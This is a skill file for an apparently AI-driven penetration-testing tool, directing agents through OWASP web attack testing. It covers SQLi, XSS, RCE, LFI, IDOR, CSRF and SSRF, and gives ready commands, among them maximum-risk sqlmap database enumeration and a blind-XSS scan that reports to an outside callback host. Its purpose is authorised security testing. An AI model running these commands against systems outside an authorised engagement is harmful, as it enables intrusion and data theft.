---
name: web-attack-methods
description: OWASP WSTG web attack taxonomy — SQLi, XSS, RCE, LFI, IDOR, CSRF, SSRF playbook
license: apache-2.0
compatibility: ">=3.2"
metadata:
  version: "1.0.0"
  tags: ["web", "sqli", "xss", "rce", "lfi", "idor", "csrf", "ssrf"]
  triggers: ["sql injection", "xss", "rce", "lfi", "idor", "csrf", "ssrf"]
allowed-tools: "nuclei,sqlmap,dalfox,nikto,wpscan"
mapped-agents: ["penetration", "vulnerability-triage"]
---

# web-attack-methods

## Overview

OWASP Web Security Testing Guide (WSTG v4.2) attack taxonomy. Covers the 7 main web attack classes: SQL Injection (WSTG-INPV-05), XSS (WSTG-INPV-02), RCE (WSTG-INPV-11), LFI/RFI (WSTG-INPV-12), IDOR (WSTG-ATHZ-04), CSRF (WSTG-SESS-05), SSRF (WSTG-INPV-19).

## When to Use

Use when target is a web application (HTTP/HTTPS). Especially for: form inputs, URL parameters, HTTP headers, JSON/XML API bodies, file upload endpoints. Loaded automatically by penetration + vulnerability-triage agents.

**Mapped agents**: penetration, vulnerability-triage

## Methodology

- 1. Map attack surface (use attack-surface-recon skill results)
- 2. For each input vector: test SQLi (sqlmap --batch --risk=3 --level=5)
- 3. Test XSS (dalfox + manual payload injection)
- 4. Test RCE/LFI (template injection, file inclusion via ffuf wordlists)
- 5. Test IDOR (replace IDs in URL/JSON + observe responses)
- 6. Test CSRF (token absence + SameSite cookie analysis)
- 7. Test SSRF (URL parameter manipulation to internal hosts)
- 8. For each finding: capture PoC, CVSS v3.1 vector, WSTG ID, MITRE ATT&CK technique

## Tool Recipes

```bash
sqlmap -u 'http://target/page?id=1' --batch --risk=3 --level=5 --dbs
```
```bash
dalfox url 'http://target/page?q=test' --blind 'https://hacker.xss.ht'
```
```bash
nuclei -u http://target -t cves/2024/ -severity high,critical
```
```bash
ffuf -u 'http://target/FUZZ' -w /usr/share/wordlists/dirb/common.txt -mc 200,302,401
```

## Output Standards

Each finding must include: WSTG ID (e.g. WSTG-INPV-05), CVSS v3.1 vector, MITRE ATT&CK technique (e.g. T1190), CWE ID, evidence (request/response), remediation. Use Sarif 2.1.0 for export.

## VAPT-AI Specific Notes

- This skill follows the agentskills.io specification (same as CyberStrikeAI).
- Loaded by SkillLoader (app/skills/loader.py) on first access.
- Auto-loaded by mapped agents via BaseAgent.__init__() (W11-S5).
- Skill content available via `GET /api/orchestration/skills/web-attack-methods` (W11-S6).
- D18 guardrails apply: skills do NOT bypass tool allowlist enforcement.
- HITL approval still required for destructive operations (skill content is advisory).
